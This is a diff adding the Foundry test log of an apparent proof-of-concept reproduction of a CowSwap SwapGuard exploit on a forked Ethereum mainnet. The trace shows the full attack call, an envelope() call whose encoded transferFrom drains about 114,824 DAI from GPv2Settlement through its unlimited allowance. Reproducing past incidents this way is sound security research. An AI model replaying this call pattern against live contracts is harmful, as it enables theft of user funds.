@@ -1,0 +1,47 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+No files changed, compilation skipped
+
+Ran 1 test for test/CowSwap_exp.sol:ContractTest
+[PASS] testExploit() (gas: 59974)
+Logs:
+  Attacker DAI balance after exploit: 114824.890807160711319588
+
+Traces:
+  [14392] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 16574048 [1.657e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], "DAI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SwapGuard: [0xcD07a7695E3372aCD2B2077557DE93e667B92bd8], "SwapGuard")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(GPv2Settlement: [0x9008D19f58AAbD9eD0D60971565AA8510560ab41], "GPv2Settlement")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [64774] ContractTest::testExploit()
+    ├─ [2602] DAI::balanceOf(GPv2Settlement: [0x9008D19f58AAbD9eD0D60971565AA8510560ab41]) [staticcall]
+    │   └─ ← [Return] 114824890807160711319588 [1.148e23]
+    ├─ [2677] DAI::allowance(GPv2Settlement: [0x9008D19f58AAbD9eD0D60971565AA8510560ab41], SwapGuard: [0xcD07a7695E3372aCD2B2077557DE93e667B92bd8]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [34510] SwapGuard::envelope([Data({ target: 0x6B175474E89094C44Da98b954EedeAC495271d0F, value: 0, callData: 0x23b872dd0000000000000000000000009008d19f58aabd9ed0d60971565aa8510560ab410000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000001850ab783cc486b29024 })], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x6B175474E89094C44Da98b954EedeAC495271d0F], [0], [0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [2602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [26518] DAI::transferFrom(GPv2Settlement: [0x9008D19f58AAbD9eD0D60971565AA8510560ab41], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114824890807160711319588 [1.148e23])
+    │   │   ├─ emit Transfer(from: GPv2Settlement: [0x9008D19f58AAbD9eD0D60971565AA8510560ab41], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 114824890807160711319588 [1.148e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x31adef62206227419133dd9a6b4041532c22595206a596cf74f19493bfc8f368: 0x000000000000000000000000000000000000000000001850ab783cc486b29024 → 0
+    │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x000000000000000000000000000000000000000000001850ab783cc486b29024
+    │   │   └─ ← [Return] true
+    │   ├─ [602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 114824890807160711319588 [1.148e23]
+    │   └─ ← [Stop]
+    ├─ [602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 114824890807160711319588 [1.148e23]
+    ├─ [240] DAI::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker DAI balance after exploit", val: 114824890807160711319588 [1.148e23], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.46s (1.27s CPU time)
+
+Ran 1 test suite in 2.46s (2.46s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
